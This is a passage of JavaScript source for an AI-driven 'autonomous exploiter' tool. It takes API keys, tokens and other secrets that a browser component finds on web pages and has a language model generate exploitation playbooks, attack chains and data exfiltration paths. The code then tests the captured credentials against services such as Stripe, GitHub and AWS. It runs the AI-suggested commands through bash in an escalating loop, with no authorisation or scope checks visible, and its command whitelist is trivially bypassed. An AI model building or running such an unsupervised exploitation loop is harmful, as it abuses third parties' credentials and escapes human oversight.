                    'Content-Type': 'application/json',
                    'x-api-key': this.config.apiKey,
                    'anthropic-version': '2023-06-01'
                }
            };

            const req = https.request(options, (res) => {
                let body = '';
                res.on('data', chunk => body += chunk);
                res.on('end', () => {
                    try {
                        const json = JSON.parse(body);
                        if (json.content && json.content[0]) {
                            resolve(json.content[0].text);
                        } else {
                            resolve(body);
                        }
                    } catch (e) {
                        resolve(body);
                    }
                });
            });

            req.on('error', reject);
            req.write(data);
            req.end();
        });
    },

    // Analyze vulnerability with AI (Enhanced v5.0)
    async analyzeVulnerability(finding, browserContext) {
        const prompt = `Analyze this security finding discovered by the BROWSER AI:

FINDING:
${JSON.stringify(finding, null, 2)}

BROWSER CONTEXT:
- URL: ${browserContext.url || 'unknown'}
- Domain: ${browserContext.domain || 'unknown'}
- Page Title: ${browserContext.title || 'unknown'}

PERFORM DEEP ANALYSIS:
1. Identify the exact service/API this credential belongs to
2. Determine the permission scope and access level
3. Check if this can be chained with other findings
4. Generate 5 precise curl commands for validation and exploitation
5. Calculate CVSS v3.1 score with vector string
6. Estimate realistic bug bounty payout range
7. Suggest what the BROWSER AI should scan next on this page

Respond in JSON:
{
  "service": "...",
  "isExploitable": true/false,
  "severity": "CRITICAL/HIGH/MEDIUM/LOW",
  "cvss": { "score": 0.0, "vector": "CVSS:3.1/AV:N/AC:L/..." },
  "permissions": ["read", "write", "admin"],
  "exploitCommands": ["curl ..."],
  "bountyEstimate": { "min": "$X,XXX", "max": "$XX,XXX", "platform": "HackerOne/Bugcrowd" },
  "chainPotential": "...",
  "nextBrowserActions": ["scan for ...", "check ..."],
  "explanation": "..."
}`;

        return await this.query(prompt, { systemPrompt: AI_SYSTEM_PROMPTS.vuln_analyzer });
    },

    // Generate exploitation plan (Enhanced v5.0)
    async generateExploitPlan(findings, browserData) {
        const prompt = `Create a COMPREHENSIVE exploitation plan based on findings from the BROWSER AI.

FINDINGS FROM BROWSER (${findings.length} total):
${JSON.stringify(findings.slice(0, 25), null, 2)}

BROWSER DATA:
- URL: ${browserData.url || 'unknown'}
- Domain: ${browserData.domain || 'unknown'}
- Cookies: ${browserData.cookies?.length || 0}
- LocalStorage items: ${browserData.localStorage?.length || 0}
- Title: ${browserData.title || 'unknown'}

CREATE EXPLOITATION PLAYBOOK:
1. Prioritize by impact × exploitability
2. Generate step-by-step exploitation with EXACT curl commands
3. Identify attack chains (combining multiple findings)
4. Map data exfiltration paths
5. Identify privilege escalation opportunities
6. Calculate TOTAL bounty potential
7. Define what BROWSER AI should do next (more scanning targets)

Respond in JSON:
{
  "priority": [{"finding": "...", "reason": "...", "impact": "CRITICAL/HIGH/MEDIUM"}],
  "exploitationSteps": [
    { "step": 1, "target": "...", "command": "curl ...", "expectedResult": "...", "nextAction": "..." }
  ],
  "attackChains": [{"name": "...", "steps": [...], "impact": "..."}],
  "nextBrowserActions": ["..."],
  "estimatedTotalBounty": "$XX,XXX",
  "riskAssessment": "..."
}`;

        return await this.query(prompt, { systemPrompt: AI_SYSTEM_PROMPTS.exploit_planner });
    },

    // ═══════════════════════════════════════════════════════════════════════
    // AI COLLABORATION — Terminal AI ↔ Browser AI Communication (ENHANCED v2.0)
    // Uses TokenResearch & AIMemory for persistent learning
    // ═══════════════════════════════════════════════════════════════════════

    // Process incoming data from browser and generate AI response
    async processCollaboration(browserFindings, browserData, ws) {
        if (!this.config.isActive || !this.config.collaborationMode) return null;

        log('🤝 AI COLLABORATION: Processing browser data...', 'magenta');

        // Update browser AI context
        this.browserAIContext = {
            domain: browserData.domain || browserData.url || 'unknown',
            findingsCount: browserFindings.length,
            lastScan: new Date().toISOString(),
            criticalCount: browserFindings.filter(f => f.severity === 'critical' || f.severity === 'CRITICAL').length,
            highCount: browserFindings.filter(f => f.severity === 'high' || f.severity === 'HIGH').length,
            liveCount: browserFindings.filter(f => f.live).length
        };

        // STEP 1: Research each token before AI analysis
        log('🔬 Researching tokens...', 'cyan');
        const enrichedFindings = [];

        for (const finding of browserFindings.slice(0, 50)) {  // Limit to 50 findings
            const type = finding.type || finding.patternName || AIMemory.guessType(finding.value || '');
            const research = await TokenResearch.research(finding.value, type);

            enrichedFindings.push({
                ...finding,
                type,
                research,
                memoryHits: AIMemory.findSimilarTokens(finding.value || '').length,
                recommendations: AIMemory.getExploitRecommendations(type)
            });
        }

        // STEP 2: Build comprehensive prompt with research data
        const prompt = `The BROWSER AI has sent ${browserFindings.length} findings from: ${browserData.domain || browserData.url || 'unknown'}

ENRICHED FINDINGS (with research):
${enrichedFindings.slice(0, 20).map((f, i) => {
            const r = f.research;
            return `[${i}] TYPE: ${f.type}
    VALUE: ${(f.value || '').substring(0, 40)}...
    SERVICE: ${r?.service || 'Unknown'}
    IMPACT: ${r?.impact || 'Unknown'}
    BOUNTY ESTIMATE: ${r?.bountyEstimate || 'N/A'}
    TEST COMMANDS: ${r?.exploitCommands?.slice(0, 2).join(' | ') || 'None'}
    LEARNED EXPLOITS: ${f.recommendations?.length || 0} from memory
    SEVERITY: ${f.severity || 'unknown'}`;
        }).join('\n\n')}

BROWSER CONTEXT:
- URL: ${browserData.url || 'unknown'}
- Domain: ${browserData.domain || 'unknown'}
- Title: ${browserData.title || 'unknown'}

AI MEMORY STATS:
- Total tokens analyzed: ${AIMemory.data.totalTokensAnalyzed}
- Total exploits found: ${AIMemory.data.totalExploitsFound}
- Services learned: ${Object.keys(AIMemory.data.serviceSignatures).length}

AS THE TERMINAL AI, provide:
1. DETAILED assessment with specific vulnerability names
2. EXACT curl commands to validate each finding (use actual token values)
3. What the BROWSER AI should scan NEXT on this page
4. Attack chains combining multiple findings
5. Remediation advice for the target

Respond in this JSON format:
{
  "assessment": "Detailed analysis of all findings...",
  "criticalFindings": [
    {
      "index": 0,
      "type": "API_KEY_TYPE",
      "service": "Service Name",
      "analysis": "Why this is dangerous",
      "validateCommand": "curl -X GET ...",
      "impact": "What can be accessed",
      "bountyEstimate": "$X,XXX",
      "cvss": 8.5
    }
  ],
  "nextBrowserActions": [
    {"action": "scan", "target": "localStorage", "reason": "May contain session tokens"},
    {"action": "extract", "target": "window.__INITIAL_STATE__", "reason": "React state may have secrets"}
  ],
  "attackChains": [
    {
      "name": "Chain Name",
      "impact": "Full account takeover",
      "steps": ["Step 1", "Step 2", "Step 3"]
    }
  ],
  "operatorActions": ["Priority action 1", "Priority action 2"],
  "overallRisk": "CRITICAL/HIGH/MEDIUM/LOW",
  "estimatedBounty": "$X,XXX",
  "securityReport": {
    "summary": "Executive summary for bug bounty report",
    "affectedEndpoints": ["endpoint1", "endpoint2"],
    "proofOfConcept": "Detailed PoC steps",
    "remediation": ["Fix 1", "Fix 2"]
  }
}`;

        try {
            const response = await this.query(prompt, {
                systemPrompt: AI_SYSTEM_PROMPTS.collaborator,
                collaboration: true,
                browserData: browserData
            });

            // Log collaboration in AIMemory
            AIMemory.recordConversation('browser', 'terminal',
                { findingsCount: browserFindings.length, domain: browserData.domain },
                response
            );

            // Log collaboration locally
            const collabEntry = {
                timestamp: new Date().toISOString(),
                direction: 'browser→terminal',
                findingsReceived: browserFindings.length,
                responseGenerated: !!response,
                domain: browserData.domain
            };
            this.collaborationLog.push(collabEntry);

            // Save collab log
            try {
                fs.writeFileSync(CONFIG.AI_COLLAB_LOG, JSON.stringify(this.collaborationLog, null, 2));
            } catch (e) { }

            // Parse and display the response
            if (typeof response === 'string') {
                try {
                    const jsonMatch = response.match(/\{[\s\S]*\}/)?.[0];
                    if (jsonMatch) {
                        const parsed = JSON.parse(jsonMatch);

                        // Display terminal-side analysis
                        log('', 'cyan');
                        logBox('🤝 AI COLLABORATION RESULT', [
                            `Domain: ${browserData.domain || 'unknown'}`,
                            `Findings Analyzed: ${browserFindings.length}`,
                            `Overall Risk: ${parsed.overallRisk || 'UNKNOWN'}`,
                            `Estimated Bounty: ${parsed.estimatedBounty || 'N/A'}`,
                            '',
                            `Assessment: ${(parsed.assessment || '').substring(0, 60)}...`,
                            '',
                            `Critical Items: ${parsed.criticalFindings?.length || 0}`,
                            `Attack Chains: ${parsed.attackChains?.length || 0}`,
                            `Next Browser Actions: ${parsed.nextBrowserActions?.length || 0}`,
                            `Operator Actions: ${parsed.operatorActions?.length || 0}`
                        ], 'magenta');

                        // Show detailed critical findings
                        if (parsed.criticalFindings?.length > 0) {
                            log('\n📛 CRITICAL FINDINGS:', 'red');
                            for (const cf of parsed.criticalFindings.slice(0, 5)) {
                                log(`  [${cf.index}] ${cf.type || 'Unknown'}`, 'yellow');
                                log(`      Service: ${cf.service || 'Unknown'}`, 'white');
                                log(`      Impact: ${cf.impact || 'Unknown'}`, 'white');
                                log(`      Bounty: ${cf.bountyEstimate || 'N/A'}`, 'green');
                                if (cf.validateCommand) {
                                    log(`      Test: ${cf.validateCommand.substring(0, 80)}...`, 'cyan');
                                }
                            }
                        }

                        // Auto-execute validation commands
                        if (CONFIG.AUTO_AI_ANALYZE && parsed.criticalFindings) {
                            log('\n🔍 AUTO-VALIDATING CRITICAL FINDINGS...', 'cyan');
                            for (const cf of parsed.criticalFindings.slice(0, 3)) {
                                if (cf.validateCommand && CommandExecutor.isAllowed(cf.validateCommand)) {
                                    log(`   Executing: ${cf.validateCommand.substring(0, 60)}...`, 'cyan');
                                    const result = await CommandExecutor.execute(cf.validateCommand);
                                    cf.validationResult = result;

                                    // Learn from validation
                                    const finding = enrichedFindings[cf.index];
                                    if (finding) {
                                        AIMemory.learnFromToken(
                                            finding.value,
                                            cf.type || finding.type,
                                            { service: cf.service, impact: cf.impact },
                                            { success: result.success, command: cf.validateCommand, output: result.output?.substring(0, 500) }
                                        );
                                    }

                                    // Display result
                                    if (result.success) {
                                        log(`   ✅ VALID: ${result.output?.substring(0, 100) || 'Success'}`, 'green');
                                    } else {
                                        log(`   ❌ Failed: ${result.error || 'Unknown error'}`, 'red');
                                    }
                                }
                            }
                        }

                        // Save AIMemory
                        AIMemory.save();

                        // 🔥 TRIGGER AUTONOMOUS EXPLOITER
                        if (CONFIG.AUTO_AI_ANALYZE && enrichedFindings.length > 0) {
                            log('\n🔥 Launching Autonomous Exploiter...', 'red');
                            AutonomousExploiter.init(ws);
                            // Run async - don't block response
                            AutonomousExploiter.run(enrichedFindings, browserData).catch(e => {
                                log(`Exploiter error: ${e.message}`, 'red');
                            });
                        }

                        // Send back enriched response to browser AI
                        if (ws && ws.readyState === WebSocket.OPEN) {
                            ws.send(JSON.stringify({
                                type: 'ai_collaboration',
                                direction: 'terminal→browser',
                                analysis: parsed,
                                nextActions: parsed.nextBrowserActions || [],
                                terminalFindings: parsed.criticalFindings || [],
                                operatorActions: parsed.operatorActions || [],
                                securityReport: parsed.securityReport || null,
                                memoryStats: AIMemory.getStats(),
                                fromTerminalAI: true,
                                timestamp: new Date().toISOString()
                            }));
                            log('📤 Collaboration response sent to browser AI', 'green');
                        }

                        return parsed;
                    }
                } catch (e) {
                    log(`Collab response parse warning: ${e.message}`, 'yellow');
                }
            }

            return response;
        } catch (e) {
            log(`AI Collaboration error: ${e.message}`, 'red');
            return null;
        }
    },

    // Send a task request to browser AI
    async sendToBrowserAI(task, data, ws) {
        if (!ws || ws.readyState !== WebSocket.OPEN) return;

        const taskId = generateToken().substring(0, 8);

        ws.send(JSON.stringify({
            type: 'ai_task',
            taskId,
            task,
            data,
            fromTerminalAI: true,
            timestamp: new Date().toISOString()
        }));

        this.pendingCollabTasks.push({ taskId, task, sentAt: Date.now() });
        log(`📤 Task sent to browser AI: ${task}`, 'magenta');

        return taskId;
    },

    // Process response from browser AI
    async handleBrowserAIResponse(message, ws) {
        log(`📥 Browser AI response: ${message.taskId || 'direct'}`, 'magenta');

        // Remove from pending
        this.pendingCollabTasks = this.pendingCollabTasks.filter(t => t.taskId !== message.taskId);

        // If browser AI sent new findings, analyze them
        if (message.findings && message.findings.length > 0) {
            log(`🔍 Browser AI found ${message.findings.length} new items`, 'green');
            message.findings.forEach(f => DataStore.addFinding(f));

            // Run deeper analysis on new findings
            if (this.config.deepAnalysis && message.findings.length > 0) {
                await this.processCollaboration(message.findings, message.browserData || {}, ws);
            }
        }

        // Log collaboration
        this.collaborationLog.push({
            timestamp: new Date().toISOString(),
            direction: 'browser→terminal (response)',
            taskId: message.taskId,
            findingsReceived: message.findings?.length || 0
        });
    }
};

// ══════════════════════════════════════════════════════════════════════════════
// COMMAND EXECUTOR
// ══════════════════════════════════════════════════════════════════════════════

const CommandExecutor = {
    history: [],
    results: [],

    // Allowed commands (security whitelist) - comprehensive for bug bounty
    allowedCommands: [
        // HTTP/API testing
        'curl', 'wget', 'httpie', 'http',
        // DNS/Network
        'nslookup', 'dig', 'host', 'whois', 'ping', 'traceroute', 'mtr', 'netstat', 'ss', 'ip',
        // Security tools
        'openssl', 'nmap', 'nikto', 'sqlmap', 'nuclei', 'ffuf', 'gobuster', 'dirb', 'wfuzz',
        'hydra', 'john', 'hashcat', 'masscan', 'amass', 'subfinder', 'httpx', 'gau', 'waybackurls',
        // Basic shell commands
        'echo', 'cat', 'head', 'tail', 'grep', 'awk', 'sed', 'sort', 'uniq', 'wc', 'tr', 'cut',
        'ls', 'pwd', 'whoami', 'id', 'uname', 'date', 'uptime', 'df', 'du', 'free', 'ps', 'top',
        'find', 'locate', 'which', 'whereis', 'file', 'stat', 'touch', 'mkdir', 'cp', 'mv', 'rm',
        // Text/Data processing
        'base64', 'jq', 'xxd', 'hexdump', 'strings', 'md5sum', 'sha256sum', 'sha1sum',
        // Scripting
        'python', 'python3', 'node', 'ruby', 'perl', 'php', 'bash', 'sh',
        // Extras
        'env', 'export', 'set', 'history', 'clear', 'sleep', 'timeout', 'xargs'
    ],

    isAllowed(command) {
        const cmd = command.trim().split(/\s+/)[0];
        const baseCmd = path.basename(cmd);
        return this.allowedCommands.includes(baseCmd);
    },

    // Execute command
    async execute(command, timeout = CONFIG.COMMAND_TIMEOUT) {
        return new Promise((resolve) => {
            const startTime = Date.now();

            // Log command
            log(`$ ${command.substring(0, 100)}${command.length > 100 ? '...' : ''}`, 'cyan');

            if (!this.isAllowed(command)) {
                const result = {
                    success: false,
                    command,
                    error: `Command not in whitelist. Allowed: ${this.allowedCommands.slice(0, 10).join(', ')}...`,
                    duration: 0
                };
                this.history.push(result);
                resolve(result);
                return;
            }

            exec(command, {
                timeout,
                maxBuffer: 1024 * 1024 * 50, // 50MB
                shell: os.platform() === 'win32' ? 'cmd.exe' : '/bin/bash'
            }, (error, stdout, stderr) => {
                const duration = Date.now() - startTime;

                const result = {
                    success: !error,
                    command,
                    stdout: stdout || '',
                    stderr: stderr || '',
                    error: error ? error.message : null,
                    exitCode: error ? error.code : 0,
                    duration,
                    timestamp: new Date().toISOString()
                };

                this.history.push(result);
                this.results.push(result);

                // Log result
                if (result.success) {
                    log(`✓ Success (${duration}ms)`, 'green');
                    if (stdout && stdout.length < 200) {
                        console.log(`${C.dim}${stdout}${C.reset}`);
                    }
                } else {
                    log(`✗ Failed: ${result.error}`, 'red');
                }

                resolve(result);
            });
        });
    },

    // Execute multiple commands
    async executeBatch(commands, delay = 500) {
        const results = [];

        for (let i = 0; i < commands.length; i++) {
            log(`[${i + 1}/${commands.length}] Executing...`, 'blue');
            const result = await this.execute(commands[i]);
            results.push(result);

            if (i < commands.length - 1) {
                await new Promise(r => setTimeout(r, delay));
            }
        }

        return results;
    },

    // Execute with AI analysis
    async executeWithAI(command) {
        const result = await this.execute(command);

        if (result.success && TerminalAI.config.isActive) {
            log('🤖 AI analyzing result...', 'magenta');

            const analysis = await TerminalAI.query(`Analyze this command output for security implications:

Command: ${command}
Output: ${result.stdout.substring(0, 2000)}

Is there any sensitive data exposed? What are the next exploitation steps?`);

            result.aiAnalysis = analysis;

            if (typeof analysis === 'string' && analysis.length < 500) {
                console.log(`${C.magenta}AI: ${analysis}${C.reset}`);
            }
        }

        return result;
    }
};

// ══════════════════════════════════════════════════════════════════════════════
// 🔥 AUTONOMOUS EXPLOITER - AI-POWERED SECURITY TESTING ENGINE
// ══════════════════════════════════════════════════════════════════════════════

const AutonomousExploiter = {
    isRunning: false,
    exploitQueue: [],
    executedCommands: new Set(),
    vulnerabilitiesFound: [],
    scriptsGenerated: [],
    analysisHistory: [],
    maxIterations: 50,
    currentIteration: 0,
    ws: null,  // WebSocket reference

    // Deep analysis prompts for professional-level analysis
    ANALYSIS_PROMPTS: {
        initial: `You are an elite bug bounty hunter AI. Analyze these findings with EXTREME DEPTH:

FINDINGS DATA:
{{FINDINGS}}

For EACH finding, provide:
1. EXACT vulnerability type (OWASP classification)
2. CVE references if applicable
3. CVSS 3.1 score with breakdown
4. Attack surface analysis
5. Business impact assessment
6. EXACT curl commands to validate (use real values from findings)
7. Alternative exploitation paths if primary fails
8. Chained attack possibilities

Generate response as JSON:
{
  "analysis": {
    "summary": "Executive summary",
    "riskLevel": "CRITICAL/HIGH/MEDIUM/LOW",
    "cvssScore": 8.5,
    "affectedAssets": ["list of affected resources"]
  },
  "exploits": [
    {
      "findingIndex": 0,
      "vulnType": "Exposed API Key",
      "service": "AWS/GCP/Firebase/etc",
      "commands": [
        {"cmd": "curl -H 'Authorization: Bearer TOKEN' https://api...", "purpose": "Validate token"},
        {"cmd": "curl -X POST ...", "purpose": "Test write access"}
      ],
      "alternativeCommands": [
        {"cmd": "...", "purpose": "If primary fails, try this"}
      ],
      "chainedAttacks": ["Step 1", "Step 2"],
      "impact": "Full account takeover possible",
      "bountyEstimate": "$5000-$10000"
    }
  ],
  "automatedScript": "#!/bin/bash\\n# Script to automate testing\\n...",
  "nextSteps": ["What to investigate next"]
}`,

        outputAnalysis: `You are analyzing command execution output for vulnerabilities.

COMMAND: {{COMMAND}}
OUTPUT:
{{OUTPUT}}

PREVIOUS CONTEXT:
{{CONTEXT}}

Analyze deeply:
1. Is this vulnerable? What indicates vulnerability?
2. What sensitive data is exposed?
3. Can we escalate from here?
4. What NEXT commands should we run based on this output?
5. Generate exploitation script if vulnerability confirmed

Respond as JSON:
{
  "isVulnerable": true/false,
  "confidenceLevel": "HIGH/MEDIUM/LOW",
  "vulnerabilityType": "Type if vulnerable",
  "sensitiveData": ["List of exposed data"],
  "escalationPaths": ["How to escalate"],
  "nextCommands": [
    {"cmd": "next curl command...", "reason": "Why run this"},
    {"cmd": "another command...", "reason": "Explore this path"}
  ],
  "exploitScript": "#!/bin/bash\\n...",
  "proofOfConcept": "PoC steps for report",
  "alternativePaths": ["If not vulnerable, try these paths"]
}`,

        scriptGeneration: `Generate a professional automated security testing script.

TARGET INFO:
- Domain: {{DOMAIN}}
- Findings: {{FINDINGS}}
- Discovered Vulnerabilities: {{VULNS}}

Generate a comprehensive bash/python script that:
1. Tests all discovered endpoints
2. Validates all tokens/keys
3. Checks for privilege escalation
4. Documents all findings
5. Generates bug bounty ready report

Output the COMPLETE script, ready to execute.`
    },

    // Initialize exploiter with WebSocket reference
    init(ws) {
        this.ws = ws;
        this.isRunning = false;
        this.currentIteration = 0;
        log('🔥 AutonomousExploiter initialized', 'magenta');
    },

    // Extract commands from text (curl, wget, etc.)
    extractCommands(text) {
        const commands = [];

        // Curl commands
        const curlRegex = /curl\s+(?:-[A-Za-z]+\s+)*(?:'[^']*'|"[^"]*"|[^\s|&;]+)+(?:\s+(?:-[A-Za-z]+\s+)*(?:'[^']*'|"[^"]*"|[^\s|&;]+)+)*/gi;
        const curlMatches = text.match(curlRegex) || [];
        curlMatches.forEach(cmd => {
            const cleaned = cmd.replace(/\\n/g, ' ').trim();
            if (cleaned.length > 10) commands.push({ type: 'curl', cmd: cleaned });
        });

        // wget commands
        const wgetRegex = /wget\s+[^\n|&;]+/gi;
        const wgetMatches = text.match(wgetRegex) || [];
        wgetMatches.forEach(cmd => commands.push({ type: 'wget', cmd: cmd.trim() }));

        // httpie commands
        const httpRegex = /(?:http|https)\s+(?:GET|POST|PUT|DELETE|PATCH)\s+[^\n|&;]+/gi;
        const httpMatches = text.match(httpRegex) || [];
        httpMatches.forEach(cmd => commands.push({ type: 'httpie', cmd: cmd.trim() }));

        // nmap commands
        const nmapRegex = /nmap\s+[^\n|&;]+/gi;
        const nmapMatches = text.match(nmapRegex) || [];
        nmapMatches.forEach(cmd => commands.push({ type: 'nmap', cmd: cmd.trim() }));

        // sqlmap commands
        const sqlmapRegex = /sqlmap\s+[^\n|&;]+/gi;
        const sqlmapMatches = text.match(sqlmapRegex) || [];
        sqlmapMatches.forEach(cmd => commands.push({ type: 'sqlmap', cmd: cmd.trim() }));

        // ffuf/gobuster commands
        const fuzzerRegex = /(?:ffuf|gobuster|dirb|wfuzz)\s+[^\n|&;]+/gi;
        const fuzzerMatches = text.match(fuzzerRegex) || [];
        fuzzerMatches.forEach(cmd => commands.push({ type: 'fuzzer', cmd: cmd.trim() }));

        // nuclei commands
        const nucleiRegex = /nuclei\s+[^\n|&;]+/gi;
        const nucleiMatches = text.match(nucleiRegex) || [];
        nucleiMatches.forEach(cmd => commands.push({ type: 'nuclei', cmd: cmd.trim() }));

        return commands;
    },

    // Build commands from findings
    buildCommandsFromFindings(findings) {
        const commands = [];

        for (const finding of findings) {
            const type = (finding.type || finding.patternName || '').toLowerCase();
            const value = finding.value || '';
            const research = finding.research || {};

            // Use research-provided commands
            if (research.exploitCommands) {
                research.exploitCommands.forEach(cmd => {
                    commands.push({ type: 'research', cmd, finding });
                });
            }

            // API Key testing
            if (type.includes('api') || type.includes('key') || type.includes('token')) {
                if (type.includes('google') || type.includes('gcp') || value.startsWith('AIza')) {
                    commands.push({
                        type: 'google',
                        cmd: `curl -s "https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=${value}"`,
                        finding
                    });
                    commands.push({
                        type: 'google',
                        cmd: `curl -s "https://maps.googleapis.com/maps/api/geocode/json?address=test&key=${value}"`,
                        finding
                    });
                }

                if (type.includes('aws') || value.startsWith('AKIA')) {
                    commands.push({
                        type: 'aws',
                        cmd: `curl -s -H "X-Api-Key: ${value}" https://sts.amazonaws.com/?Action=GetCallerIdentity`,
                        finding
                    });
                }

                if (type.includes('firebase')) {
                    const projectMatch = value.match(/([a-z0-9-]+)\.firebaseio\.com/);
                    if (projectMatch) {
                        commands.push({
                            type: 'firebase',
                            cmd: `curl -s "https://${projectMatch[1]}.firebaseio.com/.json"`,
                            finding
                        });
                    }
                }

                if (type.includes('stripe') || value.startsWith('sk_')) {
                    commands.push({
                        type: 'stripe',
                        cmd: `curl -s -u "${value}:" https://api.stripe.com/v1/charges?limit=1`,
                        finding
                    });
                }

                if (type.includes('github') || value.startsWith('ghp_')) {
                    commands.push({
                        type: 'github',
                        cmd: `curl -s -H "Authorization: token ${value}" https://api.github.com/user`,
                        finding
                    });
                }

                if (type.includes('slack') || value.startsWith('xox')) {
                    commands.push({
                        type: 'slack',
                        cmd: `curl -s "https://slack.com/api/auth.test?token=${value}"`,
                        finding
                    });
                }

                if (type.includes('twilio')) {
                    commands.push({
                        type: 'twilio',
                        cmd: `curl -s -X GET "https://api.twilio.com/2010-04-01/Accounts.json" -u "${value}:"`,
                        finding
                    });
                }

                if (type.includes('sendgrid')) {
                    commands.push({
                        type: 'sendgrid',
                        cmd: `curl -s -H "Authorization: Bearer ${value}" "https://api.sendgrid.com/v3/user/profile"`,
                        finding
                    });
                }
            }

            // JWT Testing
            if (type.includes('jwt') || /^eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+/.test(value)) {
                const parts = value.split('.');
                if (parts.length >= 2) {
                    commands.push({
                        type: 'jwt',
                        cmd: `echo "${parts[1]}" | base64 -d 2>/dev/null | jq .`,
                        finding,
                        purpose: 'Decode JWT payload'
                    });
                }
            }

            // URL/Endpoint testing
            if (type.includes('url') || type.includes('endpoint') || value.startsWith('http')) {
                commands.push({
                    type: 'http',
                    cmd: `curl -s -I -X OPTIONS "${value}"`,
                    finding,
                    purpose: 'Check CORS'
                });
                commands.push({
                    type: 'http',
                    cmd: `curl -s -w "%{http_code}" -o /dev/null "${value}"`,
                    finding,
                    purpose: 'Check accessibility'
                });
            }
        }

        return commands;
    },

    // Run autonomous exploitation
    async run(findings, browserData = {}) {
        if (this.isRunning) {
            log('⚠️ Autonomous exploiter already running', 'yellow');
            return;
        }

        this.isRunning = true;
        this.currentIteration = 0;
        this.vulnerabilitiesFound = [];
        this.scriptsGenerated = [];

        logBox('🔥 AUTONOMOUS EXPLOITER STARTED', [
            `Findings to analyze: ${findings.length}`,
            `Domain: ${browserData.domain || 'unknown'}`,
            `Max iterations: ${this.maxIterations}`,
            '',
            'AI will:',
            '  • Extract & run all curl commands',
            '  • Analyze outputs for vulnerabilities',
            '  • Generate exploitation scripts',
            '  • Find alternative attack paths',
            '  • Continue until fully explored'
        ], 'red');

        try {
            // PHASE 1: Deep AI Analysis of findings
            log('\n📊 PHASE 1: Deep Analysis...', 'magenta');
            const analysis = await this.deepAnalyzeFindings(findings, browserData);

            if (!analysis) {
                log('❌ Analysis failed, stopping', 'red');
                this.isRunning = false;
                return;
            }

            // PHASE 2: Build command queue from AI analysis + findings
            log('\n⚡ PHASE 2: Building command queue...', 'cyan');

            // Commands from AI analysis
            if (analysis.exploits) {
                for (const exploit of analysis.exploits) {
                    if (exploit.commands) {
                        exploit.commands.forEach(c => {
                            if (!this.executedCommands.has(c.cmd)) {
                                this.exploitQueue.push({
                                    cmd: c.cmd,
                                    purpose: c.purpose,
                                    source: 'ai_analysis',
                                    findingIndex: exploit.findingIndex
                                });
                            }
                        });
                    }
                    if (exploit.alternativeCommands) {
                        exploit.alternativeCommands.forEach(c => {
                            if (!this.executedCommands.has(c.cmd)) {
                                this.exploitQueue.push({
                                    cmd: c.cmd,
                                    purpose: c.purpose,
                                    source: 'ai_alternative',
                                    findingIndex: exploit.findingIndex
                                });
                            }
                        });
                    }
                }
            }

            // Commands built from findings
            const findingCommands = this.buildCommandsFromFindings(findings);
            findingCommands.forEach(c => {
                if (!this.executedCommands.has(c.cmd)) {
                    this.exploitQueue.push({
                        cmd: c.cmd,
                        purpose: c.purpose || `Test ${c.type}`,
                        source: 'finding_generated'
                    });
                }
            });

            log(`📋 ${this.exploitQueue.length} commands queued for execution`, 'yellow');

            // PHASE 3: Execute commands and analyze outputs
            log('\n🚀 PHASE 3: Executing commands...', 'green');
            await this.executeQueue(browserData);

            // PHASE 4: Generate scripts
            log('\n📜 PHASE 4: Generating exploitation scripts...', 'magenta');
            await this.generateExploitScripts(browserData);

            // PHASE 5: Report
            this.generateReport(browserData);

        } finally {
            this.isRunning = false;
            log('\n🏁 Autonomous exploitation complete', 'green');
        }
    },

    // Deep analyze findings with AI
    async deepAnalyzeFindings(findings, browserData) {
        const prompt = this.ANALYSIS_PROMPTS.initial
            .replace('{{FINDINGS}}', JSON.stringify(findings.slice(0, 30).map(f => ({
                type: f.type,
                value: (f.value || '').substring(0, 100),
                severity: f.severity,
                live: f.live,
                source: f.source,
                research: f.research
            })), null, 2))
            .replace('{{DOMAIN}}', browserData.domain || 'unknown');

        const response = await TerminalAI.query(prompt, { deepAnalysis: true });

        if (typeof response === 'string') {
            try {
                const jsonMatch = response.match(/\{[\s\S]*\}/)?.[0];
                if (jsonMatch) {
                    const parsed = JSON.parse(jsonMatch);
                    this.analysisHistory.push({ type: 'initial', data: parsed });

                    // Display analysis summary
                    if (parsed.analysis) {
                        logBox('📊 AI DEEP ANALYSIS', [
                            `Risk: ${parsed.analysis.riskLevel || 'UNKNOWN'}`,
                            `CVSS: ${parsed.analysis.cvssScore || 'N/A'}`,
                            `Exploits Generated: ${parsed.exploits?.length || 0}`,
                            `${(parsed.analysis.summary || '').substring(0, 100)}...`
                        ], 'magenta');
                    }

                    return parsed;
                }
            } catch (e) {
                log(`Parse error: ${e.message}`, 'yellow');
            }
        }

        return null;
    },

    // Execute queued commands
    async executeQueue(browserData) {
        while (this.exploitQueue.length > 0 && this.currentIteration < this.maxIterations) {
            const item = this.exploitQueue.shift();
            this.currentIteration++;

            if (this.executedCommands.has(item.cmd)) continue;
            this.executedCommands.add(item.cmd);

            log(`\n[${this.currentIteration}/${this.maxIterations}] ${item.purpose || 'Testing...'}`, 'cyan');
            log(`   Source: ${item.source}`, 'dim');

            // Execute command
            const result = await CommandExecutor.execute(item.cmd);

            if (result.success && result.stdout) {
                // AI analyze the output
                const outputAnalysis = await this.analyzeOutput(item.cmd, result.stdout, browserData);

                if (outputAnalysis) {
                    // Record vulnerability if found
                    if (outputAnalysis.isVulnerable) {
                        this.vulnerabilitiesFound.push({
                            command: item.cmd,
                            output: result.stdout.substring(0, 500),
                            analysis: outputAnalysis,
                            timestamp: new Date().toISOString()
                        });

                        log(`   🔴 VULNERABILITY FOUND: ${outputAnalysis.vulnerabilityType}`, 'red');
                        log(`   Confidence: ${outputAnalysis.confidenceLevel}`, 'yellow');
                    }

                    // Add discovered commands to queue
                    if (outputAnalysis.nextCommands) {
                        for (const nextCmd of outputAnalysis.nextCommands) {
                            if (!this.executedCommands.has(nextCmd.cmd) && this.exploitQueue.length < 100) {
                                this.exploitQueue.push({
                                    cmd: nextCmd.cmd,
                                    purpose: nextCmd.reason,
                                    source: 'ai_discovered'
                                });
                                log(`   ➕ Added new command: ${nextCmd.reason}`, 'green');
                            }
                        }
                    }

                    // Try alternative paths if not vulnerable
                    if (!outputAnalysis.isVulnerable && outputAnalysis.alternativePaths) {
                        for (const altPath of outputAnalysis.alternativePaths.slice(0, 3)) {
                            const altCommands = this.extractCommands(altPath);
                            altCommands.forEach(c => {
                                if (!this.executedCommands.has(c.cmd)) {
                                    this.exploitQueue.push({
                                        cmd: c.cmd,
                                        purpose: 'Alternative path exploration',
                                        source: 'ai_alternative'
                                    });
                                }
                            });
                        }
                    }
                }
            }

            // Rate limit protection
            await new Promise(r => setTimeout(r, 1000));
        }
    },

    // Analyze command output with AI
